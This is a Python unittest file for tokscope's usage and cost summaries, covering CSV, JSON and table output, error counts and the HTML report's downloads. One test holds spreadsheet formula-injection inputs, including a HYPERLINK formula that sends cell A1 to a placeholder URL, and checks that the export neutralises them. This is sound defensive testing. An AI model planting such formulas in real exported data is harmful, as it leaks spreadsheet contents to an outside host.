"""Summary rows as CSV and JSON: the CLI --format, /api/summary, the Summary section and the report's downloads."""
import contextlib
import csv
import io
import json
import re
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tokscope import cli
from tokscope.core import errors, summary
from tokscope.core.ingest import connect
from tokscope.web.report import write_report

from tests.test_dashboard import ts


def seed(db):
    conn = connect(db)
    conn.execute("INSERT INTO sessions (session_id, project, cwd, title, prompts) VALUES ('s1', '-home-u-app', '/home/u/app', 't', 1)")
    for key, days, skill, phase, model, cost in (("a", 1, "xia2", "plan", "claude-opus-5-5", 3.0), ("b", 2, "xia2", "plan", "claude-opus-5-5", 1.5),
                                                 ("c", 3, None, "plan", "claude-opus-5-5", 0.5), ("d", 2, "other, \"q\"", "build", "claude-foo-9", None)):
        conn.execute("INSERT INTO requests (session_id, request_key, ts, model, prompt_idx, skill, phase, input, output, cache_read, "
                     "cache_write_5m, cache_write_1h, cost_usd) VALUES ('s1', ?, ?, ?, 1, ?, ?, 100, 10, 50, 0, 0, ?)",
                     (key, ts(days), model, skill, phase, cost))
    conn.commit()
    return conn


class CliTest(unittest.TestCase):
    def setUp(self):
        self.db = Path(tempfile.mkdtemp()) / "t.db"
        seed(self.db).close()

    def run_cli(self, **kw):
        args = cli.argparse.Namespace(by="skill", since=None, until=None, project=None, limit=25, **kw)
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), mock.patch.object(cli, "DB", self.db):
            cli.summary(args)
        return out.getvalue(), err.getvalue()

    def seed_calls(self):
        conn = connect(self.db)
        conn.executemany("INSERT INTO tool_calls (session_id, tool_use_id, skill, phase, is_error, err_class, repeat, ts) "
                         "VALUES ('s1', ?, ?, ?, ?, ?, ?, ?)",
                         [("t1", "xia2", "plan", 1, "edit_mismatch", 0, ts(1)), ("t2", "xia2", "plan", 0, None, 1, ts(1)),
                          ("t3", "xia2", "plan", 0, None, 0, ts(1)), ("t4", None, None, 1, "exit_code", 0, ts(5))])
        conn.execute("INSERT INTO turn_events (session_id, ts, skill, phase, kind) VALUES ('s1', ?, 'xia2', 'plan', 'interrupt')",
                     (ts(1),))
        conn.commit()

    def seed_sources(self):
        """xia2, 160 tokens a request: prompt 1 (2 requests) is typed; prompt 2 (1) and 3 (2) are the model's."""
        conn = connect(self.db)
        for key, idx in (("e", 2), ("f", 3), ("g", 3)):
            conn.execute("INSERT INTO requests (session_id, request_key, ts, model, prompt_idx, skill, phase, input, output, cache_read, "
                         "cache_write_5m, cache_write_1h, cost_usd) VALUES ('s1', ?, ?, 'claude-opus-5-5', ?, 'xia2', 'plan', 100, 10, 50, 0, 0, 1)",
                         (key, ts(1), idx))
        conn.executemany("INSERT INTO skill_calls (session_id, ts, skill, source, prompt_idx, failed) VALUES ('s1', ?, 'xia2', ?, ?, ?)",
                         [(ts(1), "command", 1, 0), (ts(1), "tool", 2, 0), (ts(1), "tool", 3, 0), (ts(1), "tool", 4, 1)])
        conn.commit()

    def test_skill_summary_splits_loads_by_source_with_the_median_tokens(self):
        self.seed_sources()
        text, _ = self.run_cli(format="csv")
        rows = {r["key"]: r for r in csv.DictReader(io.StringIO(text))}
        self.assertEqual(list(rows["xia2"]), list(summary.FIELDS + summary.SOURCE_FIELDS))
        x = rows["xia2"]  # a failed load is no load; prompt 1 has two requests of 160 tokens, prompt 3 too, prompt 2 one
        self.assertEqual((x["typed_loads"], x["typed_median_tokens"], x["tool_loads"], x["tool_median_tokens"]), ("1", "320", "2", "240"))
        self.assertEqual((rows["(none)"]["typed_loads"], rows["(none)"]["typed_median_tokens"]), ("0", ""))
        table, _ = self.run_cli(format="table")
        self.assertIn("typed n/med", table)
        self.assertIn("2/240", table)

    def test_summary_without_skill_loads_adds_no_source_columns(self):
        text, _ = self.run_cli(format="csv")
        self.assertEqual(list(next(csv.DictReader(io.StringIO(text)))), list(summary.FIELDS))
        table, _ = self.run_cli(format="table")
        self.assertNotIn("typed", table)

    def test_the_skill_section_shows_both_sources_and_nothing_with_no_loads(self):
        from tokscope.web.report.sections.skills import _skill_versions

        self.assertNotIn("Loads by source", _skill_versions(connect(self.db))[1])
        self.seed_sources()
        page = _skill_versions(connect(self.db))[1]
        self.assertIn("Loads by source", page)
        self.assertIn("1 · 320", page.replace("&nbsp;", " "))
        self.assertIn("2 · 240", page.replace("&nbsp;", " "))

    def test_errors_count_failed_and_repeated_calls_and_interrupts_per_skill(self):
        self.seed_calls()
        text, err = self.run_cli(format="csv", errors=True)
        rows = {r["key"]: r for r in csv.DictReader(io.StringIO(text))}
        self.assertEqual(list(next(iter(rows.values()))), list(errors.FIELDS))
        self.assertEqual({k: (r["calls"], r["errors"], r["repeats"], r["interrupts"]) for k, r in rows.items()},
                         {"xia2": ("3", "1", "1", "1"), "(none)": ("1", "1", "0", "0")})
        self.assertIn("edit_mismatch 1", err)
        table, _ = self.run_cli(format="table", errors=True)
        self.assertIn("33.3%", table)

    def test_errors_count_failed_skill_loads_per_skill(self):
        self.seed_calls()
        conn = connect(self.db)
        conn.executemany("INSERT INTO skill_calls (session_id, ts, skill, source, failed) VALUES ('s1', ?, ?, 'tool', ?)",
                         [(ts(1), "nonexistent", 1), (ts(1), "nonexistent", 1), (ts(1), "xia2", 0)])
        conn.commit()
        text, _ = self.run_cli(format="csv", errors=True)
        rows = {r["key"]: r for r in csv.DictReader(io.StringIO(text))}
        self.assertEqual({k: r["failed_loads"] for k, r in rows.items()}, {"xia2": "0", "(none)": "0", "nonexistent": "2"})
        table, _ = self.run_cli(format="table", errors=True)
        self.assertIn("failed loads", table)

    def test_errors_follow_the_date_filter_and_refuse_a_cost_only_grouping(self):
        self.seed_calls()
        args = cli.argparse.Namespace(by="skill", since=None, until=None, project=None, limit=25, format="json", errors=True)
        found = errors.rows(connect(self.db), "skill", "WHERE r.ts > ?", (ts(3),))
        self.assertEqual([r["key"] for r in found], ["xia2"])
        args.by = "model"
        with mock.patch.object(cli, "DB", self.db), self.assertRaises(SystemExit):
            cli.summary(args)

    def test_default_and_table_are_the_same_and_keep_the_notes_on_stdout(self):
        default, _ = self.run_cli()
        table, err = self.run_cli(format="table")
        self.assertEqual(default, table)
        self.assertEqual(err, "")
        self.assertIn("API-eq", default.splitlines()[-2] + default.splitlines()[-1])

    def test_csv_and_json_print_only_the_rows_and_the_notes_go_to_stderr(self):
        text, err = self.run_cli(format="csv")
        rows = list(csv.DictReader(io.StringIO(text)))
        self.assertEqual(list(rows[0]), list(summary.FIELDS))
        self.assertEqual(rows[0]["key"], "xia2")
        self.assertIn('other, "q"', [r["key"] for r in rows])  # a comma and a quote survive the CSV
        self.assertIn("API-eq", err)
        self.assertIn("claude-foo-9", err)  # the unpriced note
        data, _ = self.run_cli(format="json")
        found = json.loads(data)
        self.assertEqual([r["key"] for r in found], [r["key"] for r in rows])
        self.assertEqual(found[0], {"key": "xia2", "requests": 2, "prompt_tokens": 300, "output_tokens": 20, "cost_usd": 4.5, "carried_cost_usd": 0.0})

    def test_the_rows_match_the_table(self):
        table, _ = self.run_cli(format="table")
        found = json.loads(self.run_cli(format="json")[0])
        for line, r in zip(table.splitlines()[1:1 + len(found)], found):
            self.assertTrue(line.startswith(r["key"][:40]))
            self.assertIn(f"{r['cost_usd']:.2f}", line)
            self.assertIn(f"{r['requests']:,}", line)

    def test_carried_cost_is_the_phase_cost_of_prompts_without_a_skill(self):
        by_phase = summary.rows(connect(self.db), "phase")
        self.assertEqual({r["key"]: r["carried_cost_usd"] for r in by_phase}, {"plan": 0.5, "build": 0.0})

    def test_a_name_a_spreadsheet_would_run_as_a_formula_gets_a_leading_quote(self):
        from tokscope.core import summary
        found = [{"key": k, "requests": 1, "prompt_tokens": 2, "output_tokens": 3, "cost_usd": 0.5, "carried_cost_usd": 0.0}
                 for k in ('=HYPERLINK("http://x/?"&A1,"open")', "+1", "-1", "@SUM(A1)", "(none)")]
        lines = summary.to_csv(found).splitlines()[1:]
        self.assertTrue(lines[0].startswith("\"'=HYPERLINK"))  # quoted because of the comma
        self.assertEqual([ln.split(",")[0] for ln in lines[1:]], ["'+1", "'-1", "'@SUM(A1)", "(none)"])
        self.assertEqual(summary.safe_cell(7), 7)

    def test_the_argument_parser_takes_only_known_formats(self):
        with mock.patch.object(sys, "argv", ["tokscope", "summary", "--format", "yaml"]), contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                cli.main()


class ReportTest(unittest.TestCase):
    def test_the_report_holds_all_four_tables_and_builds_its_downloads_in_the_browser(self):
        tmp = Path(tempfile.mkdtemp())
        seed(tmp / "t.db").close()
        out = tmp / "r.html"
        write_report(tmp / "t.db", out, tasks_dir=tmp)
        page = out.read_text()
        for by in summary.SUMMARY_SQL:
            self.assertIn(f'data-by="{by}"', page)
        self.assertEqual(len(re.findall(r'class="sum-pane"[^>]* hidden>', page)), 3)  # one table shows, three wait for the chips
        self.assertIn('data-dl="csv"', page)
        self.assertIn("new Blob", page)
        self.assertNotIn("/api/summary", page)
        self.assertIn('<a href="#summary">Summary</a>', page)


if __name__ == "__main__":
    unittest.main()
